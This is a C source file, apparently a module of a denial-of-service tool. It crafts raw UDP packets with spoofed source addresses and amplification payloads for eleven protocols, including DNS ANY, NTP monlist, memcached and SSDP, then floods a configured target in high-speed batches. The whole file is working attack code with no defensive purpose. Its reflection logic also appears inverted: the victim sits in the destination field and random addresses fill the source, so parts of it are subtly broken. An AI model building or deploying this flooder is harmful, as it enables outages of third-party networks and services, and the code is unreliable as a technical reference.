#include "../include/engine.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>
#include <sched.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/uio.h>

#define AMP_BURST 1024
#define AMP_MAX_PAYLOAD 2048
#define MAX_AMPLIFIERS 10000

static __thread unsigned int amp_rng = 0;

static inline unsigned int amp_rand(void) {
    if (amp_rng == 0) amp_rng = (unsigned int)(time(NULL) ^ (uintptr_t)&amp_rng);
    amp_rng = amp_rng * 1103515245U + 12345U;
    return amp_rng;
}

static inline uint32_t amp_spoof(void) {
    return (uint32_t)(amp_rand() | (amp_rand() << 16) | (amp_rand() & 0xFF000000));
}

typedef struct {
    char name[32];
    uint16_t port;
    int factor;
    int (*build)(unsigned char *buf, int *len, uint32_t spoof);
} amp_protocol_t;

static uint32_t amp_target_ip = 0;
static uint16_t amp_target_port = 0;
static int amp_fd = -1;

/* DNS ANY — existing optimized */
static int build_dns_any(unsigned char *buf, int *len, uint32_t spoof) {
    (void)spoof;
    static const char *domains[] = {
        "isc.org", "google.com", "facebook.com", "cloudflare.com",
        "microsoft.com", "apple.com", "amazon.com", "netflix.com",
        "twitter.com", "github.com", "whatsapp.com", "tiktok.com",
        "youtube.com", "instagram.com", "linkedin.com", "reddit.com",
        "wikipedia.org", "zoom.us", "dropbox.com", "adobe.com"
    };
    const char *domain = domains[amp_rand() % 20];
    memset(buf, 0, 64);
    int off = 0;
    uint16_t id = (uint16_t)(amp_rand() & 0xFFFF);
    buf[off++] = (id >> 8) & 0xFF; buf[off++] = id & 0xFF;
    buf[off++] = 0x01; buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x01;
    buf[off++] = 0x00; buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x00;
    const char *p = domain;
    while (*p) {
        const char *dot = strchr(p, '.');
        int ll = dot ? (int)(dot - p) : (int)strlen(p);
        if (ll > 63) ll = 63;
        buf[off++] = (unsigned char)ll;
        memcpy(buf + off, p, ll); off += ll;
        p = dot ? dot + 1 : p + ll;
    }
    buf[off++] = 0;
    buf[off++] = 0x00; buf[off++] = 0xFF;
    buf[off++] = 0x00; buf[off++] = 0x01;
    *len = off;
    return 0;
}

/* NTP monlist */
static int build_ntp_monlist(unsigned char *buf, int *len, uint32_t spoof) {
    (void)spoof;
    memset(buf, 0, 48);
    buf[0] = 0x17; buf[1] = 0x00; buf[2] = 0x03; buf[3] = 0x2A;
    buf[4] = 0; buf[5] = 0; buf[6] = 0; buf[7] = 0;
    *len = 48;
    return 0;
}

/* Memcached stats + cachedump */
static int build_memcached(unsigned char *buf, int *len, uint32_t spoof) {
    (void)spoof;
    static const char *cmds[] = {
        "stats\r\n",
        "stats cachedump 1 0\r\n",
        "stats items\r\n",
        "stats slabs\r\n",
        "lru_crawler metadump all\r\n",
        "stats conns\r\n"
    };
    const char *cmd = cmds[amp_rand() % 6];
    int clen = (int)strlen(cmd);
    memcpy(buf, "\x00\x00\x00\x00\x00\x01\x00\x00", 8);
    memcpy(buf + 8, cmd, clen);
    *len = 8 + clen;
    return 0;
}

/* WS-Discovery — amplification factor ~500x */
static int build_ws_discovery(unsigned char *buf, int *len, uint32_t spoof) {
    (void)spoof;
    const char probe[] =
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>"
        "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\""
        " xmlns:wsa=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\""
        " xmlns:wsd=\"http://schemas.xmlsoap.org/ws/2005/04/discovery\""
        " xmlns:wsdp=\"http://schemas.xmlsoap.org/ws/2006/02/devprof\">"
        "<soap:Header>"
        "<wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action>"
        "<wsa:MessageID>uuid:%08x-%04x-%04x-%04x-%012x</wsa:MessageID>"
        "<wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To>"
        "</soap:Header>"
        "<soap:Body>"
        "<wsd:Probe><wsd:Types>wsdp:Device</wsd:Types></wsd:Probe>"
        "</soap:Body></soap:Envelope>";
    *len = snprintf((char*)buf, AMP_MAX_PAYLOAD, probe,
        amp_rand(), amp_rand() & 0xFFFF, amp_rand() & 0xFFFF,
        amp_rand() & 0xFFFF, (unsigned long long)amp_rand());
    return 0;
}

/* SSDP M-SEARCH */
static int build_ssdp(unsigned char *buf, int *len, uint32_t spoof) {
    (void)spoof;
    const char ssdp[] =
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 3\r\n"
        "ST: ssdp:all\r\n"
        "USER-AGENT: Linux/6.8 UPnP/1.1 HackIT/1.0\r\n"
        "\r\n";
    *len = (int)strlen(ssdp);
    memcpy(buf, ssdp, *len);
    return 0;
}

/* CoAP — .well-known/core */
static int build_coap(unsigned char *buf, int *len, uint32_t spoof) {
    (void)spoof;
    memset(buf, 0, 64);
    buf[0] = 0x50; buf[1] = (unsigned char)(amp_rand() & 0xFF);
    buf[2] = 0x00; buf[3] = 0x01;
    buf[4] = 0xB1; buf[5] = 0x01; buf[6] = 0x00; buf[7] = 0x00;
    buf[8] = 0x00; buf[9] = 0x00;
    *len = 10;
    return 0;
}

/* mDNS — query all services */
static int build_mdns(unsigned char *buf, int *len, uint32_t spoof) {
    (void)spoof;
    memset(buf, 0, 128);
    int off = 0;
    uint16_t id = (uint16_t)(amp_rand() & 0xFFFF);
    buf[off++] = (id >> 8) & 0xFF; buf[off++] = id & 0xFF;
    buf[off++] = 0x00; buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x01;
    buf[off++] = 0x00; buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x00;
    static const char *mdns_labels[] = {"_services", "_dns-sd", "_udp", "local"};
    for (int li = 0; li < 4; li++) {
        int ll = (int)strlen(mdns_labels[li]);
        buf[off++] = (unsigned char)ll;
        memcpy(buf + off, mdns_labels[li], ll); off += ll;
    }
    buf[off++] = 0;
    buf[off++] = 0x00; buf[off++] = 0x0C;
    buf[off++] = 0x00; buf[off++] = 0x01;
    *len = off;
    return 0;
}

/* OpenVPN — P_CONTROL_HARD_RESET_CLIENT_V2 */
static int build_openvpn(unsigned char *buf, int *len, uint32_t spoof) {
    (void)spoof;
    memset(buf, 0, 64);
    *len = 62;
    buf[0] = 0x38; buf[1] = 0x01; buf[2] = 0x00; buf[3] = 0x00;
    buf[4] = 0x00; buf[5] = 0x00; buf[6] = 0x00; buf[7] = 0x00;
    uint64_t sid = (uint64_t)amp_rand() | ((uint64_t)amp_rand() << 32);
    for (int i = 0; i < 8; i++) buf[8+i] = (unsigned char)(sid >> (56 - i*8));
    buf[16] = 0x00; buf[17] = 0x00; buf[18] = 0x00; buf[19] = 0x01;
    buf[20] = 0x00; buf[21] = 0x00; buf[22] = 0x00; buf[23] = 0x01;
    for (int i = 0; i < 32; i++) buf[24+i] = (unsigned char)(amp_rand() & 0xFF);
    buf[56] = 0x00; buf[57] = 0x00; buf[58] = 0x00; buf[59] = 0x00;
    buf[60] = 0x00; buf[61] = 0x00;
    return 0;
}

/* RIPv2 request */
static int build_rip(unsigned char *buf, int *len, uint32_t spoof) {
    (void)spoof;
    memset(buf, 0, 24);
    buf[0] = 0x01; buf[1] = 0x01;
    buf[2] = 0x00; buf[3] = 0x00;
    buf[4] = 0x00; buf[5] = 0x02;
    buf[6] = 0x00; buf[7] = 0x00;
    *len = 24;
    return 0;
}

/* SNMP GetBulk */
static int build_snmp(unsigned char *buf, int *len, uint32_t spoof) {
    (void)spoof;
    memset(buf, 0, AMP_MAX_PAYLOAD);
    int off = 0;
    buf[off++] = 0x30;
    int seq_off = off; buf[off++] = 0x00;
    buf[off++] = 0x02; buf[off++] = 0x01; buf[off++] = amp_rand() & 0x7F;
    buf[off++] = 0x04; buf[off++] = 0x06; memcpy(buf+off, "public", 6); off += 6;
    buf[off++] = 0xA1;
    int gb_off = off; buf[off++] = 0x00;
    buf[off++] = 0x02; buf[off++] = 0x01; buf[off++] = 0x00;
    buf[off++] = 0x02; buf[off++] = 0x01; buf[off++] = 0x00;
    buf[off++] = 0x02; buf[off++] = 0x01; buf[off++] = 0x00;
    buf[off++] = 0x30; int vl_off = off; buf[off++] = 0x00;
    buf[off++] = 0x30; int vb_off = off; buf[off++] = 0x00;
    buf[off++] = 0x06; buf[off++] = 0x08;
    buf[off++] = 0x2B; buf[off++] = 0x06; buf[off++] = 0x01;
    buf[off++] = 0x02; buf[off++] = 0x01; buf[off++] = 0x01;
    buf[off++] = 0x02; buf[off++] = 0x00;
    buf[off++] = 0x05; buf[off++] = 0x00;
    buf[vb_off] = (unsigned char)(off - vb_off - 1);
    buf[vl_off] = (unsigned char)(off - vl_off - 1);
    buf[gb_off] = (unsigned char)(off - gb_off - 1);
    buf[seq_off] = (unsigned char)(off - seq_off - 1);
    *len = off;
    return 0;
}

/* TFTP RRQ flood */
static int build_tftp(unsigned char *buf, int *len, uint32_t spoof) {
    (void)spoof;
    memset(buf, 0, 64);
    buf[0] = 0x00; buf[1] = 0x01;
    const char *files[] = {"payload", "config", "boot", "firmware", "backup"};
    const char *f = files[amp_rand() % 5];
    int off = 2;
    memcpy(buf + off, f, strlen(f) + 1); off += (int)strlen(f) + 1;
    memcpy(buf + off, "octet", 6); off += 6;
    buf[off++] = 0;
    *len = off;
    return 0;
}

static amp_protocol_t g_amplifiers[] = {
    {"DNS_ANY",    53,    54,    build_dns_any},
    {"NTP_MONLIST", 123,  556,   build_ntp_monlist},
    {"MEMCACHED",  11211, 10000, build_memcached},
    {"WS_DISCOVERY", 3700, 500,  build_ws_discovery},
    {"SSDP",       1900,  30,    build_ssdp},
    {"CoAP",       5683,  35,    build_coap},
    {"MDNS",       5353,  10,    build_mdns},
    {"OPENVPN",    1194,  30,    build_openvpn},
    {"RIP",        520,   10,    build_rip},
    {"SNMP",       161,   30,    build_snmp},
    {"TFTP",       69,    4,     build_tftp},
};

#define NUM_AMPLIFIERS (sizeof(g_amplifiers) / sizeof(g_amplifiers[0]))

EXPORT int amp_bank_init(int sock, uint32_t target_ip, uint16_t target_port) {
    amp_fd = sock;
    amp_target_ip = target_ip;
    amp_target_port = target_port;
    amp_rng = (unsigned int)(time(NULL) ^ (uintptr_t)&amp_rng);
    return 0;
}

/* Thread-local pre-allocated buffer ring — zero malloc/free in hot path */
#define AMP_RING_SLOTS AMP_BURST
#define AMP_RING_PKT_SZ (sizeof(struct iphdr) + sizeof(struct udphdr) + AMP_MAX_PAYLOAD + 64)

static __thread unsigned char g_amp_pkt_ring[AMP_RING_SLOTS][AMP_RING_PKT_SZ];

static int amp_flood_internal(int sock, int protos, int packets) {
    if (protos <= 0 || protos > (int)NUM_AMPLIFIERS) protos = NUM_AMPLIFIERS;
    unsigned char buf[AMP_MAX_PAYLOAD];
    int total = 0;

    struct mmsghdr msgs[AMP_BURST];
    struct iovec iovecs[AMP_BURST];
    struct sockaddr_in addrs[AMP_BURST];
    for (int p = 0; p < packets; p += AMP_BURST) {
        int batch = 0;
        while (batch < AMP_BURST && (p + batch) < packets) {
            int pi = amp_rand() % protos;
            uint32_t spoof = amp_spoof();
            int len = 0;
            if (g_amplifiers[pi].build(buf, &len, spoof) < 0 || len <= 0)
                continue;

            uint16_t dport = g_amplifiers[pi].port;
            unsigned char *pkt = g_amp_pkt_ring[batch];

            memset(pkt, 0, sizeof(struct iphdr) + sizeof(struct udphdr));
            struct iphdr *ip = (struct iphdr *)pkt;
            struct udphdr *udp = (struct udphdr *)(pkt + sizeof(struct iphdr));

            int pkt_len = len + sizeof(struct iphdr) + sizeof(struct udphdr);
            ip->ihl = 5; ip->version = 4;
            ip->tot_len = htons((uint16_t)pkt_len);
            ip->id = htons((uint16_t)(amp_rand() & 0xFFFF));
            ip->frag_off = htons(0x4000);
            ip->ttl = 128; ip->protocol = IPPROTO_UDP;
            ip->saddr = spoof; ip->daddr = amp_target_ip;
            { uint32_t ck = 0; uint16_t *w = (uint16_t *)ip;
              for (int i = 0; i < 10; i++) ck += w[i];
              while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16);
              ip->check = (uint16_t)~ck; }

            udp->source = htons((uint16_t)(1024 + (amp_rand() % 64511)));
            udp->dest = htons(dport);
            udp->len = htons((uint16_t)(sizeof(struct udphdr) + len));
            memcpy(pkt + sizeof(struct iphdr) + sizeof(struct udphdr), buf, len);

            addrs[batch].sin_family = AF_INET;
            addrs[batch].sin_addr.s_addr = amp_target_ip;
            addrs[batch].sin_port = htons(dport);

            iovecs[batch].iov_base = pkt;
            iovecs[batch].iov_len = pkt_len;
            msgs[batch].msg_hdr.msg_name = &addrs[batch];
            msgs[batch].msg_hdr.msg_namelen = sizeof(addrs[batch]);
            msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
            msgs[batch].msg_hdr.msg_iovlen = 1;
            batch++;
        }
        if (batch == 0) continue;

        int off = 0, rem = batch, eagain_cnt = 0;
        while (rem > 0) {
            int ret = (int)sendmmsg(sock, msgs + off, rem, MSG_DONTWAIT);
            if (ret > 0) { off += ret; rem -= ret; total += ret; eagain_cnt = 0; }
            else if (errno == EAGAIN || errno == EWOULDBLOCK) {
                eagain_cnt++;
                if (eagain_cnt < 10) { sched_yield(); }
                else { struct timespec ts = {0, 100 * 1000L}; nanosleep(&ts, NULL); }
                continue;
            } else break;
        }
    }
    return total;
}

EXPORT int amp_bank_flood(int sock, int protos, int packets) {
    return amp_flood_internal(sock, protos, packets);
}

EXPORT int amp_bank_flood_all(int sock, int packets) {
    return amp_flood_internal(sock, NUM_AMPLIFIERS, packets);
}

EXPORT const char *amp_bank_protocol_name(int idx) {
    if (idx < 0 || idx >= (int)NUM_AMPLIFIERS) return NULL;
    return g_amplifiers[idx].name;
}

EXPORT int amp_bank_protocol_factor(int idx) {
    if (idx < 0 || idx >= (int)NUM_AMPLIFIERS) return 0;
    return g_amplifiers[idx].factor;
}

EXPORT int amp_bank_count(void) {
    return (int)NUM_AMPLIFIERS;
}

EXPORT int amp_bank_protocol_port(int idx) {
    if (idx < 0 || idx >= (int)NUM_AMPLIFIERS) return 0;
    return g_amplifiers[idx].port;
}
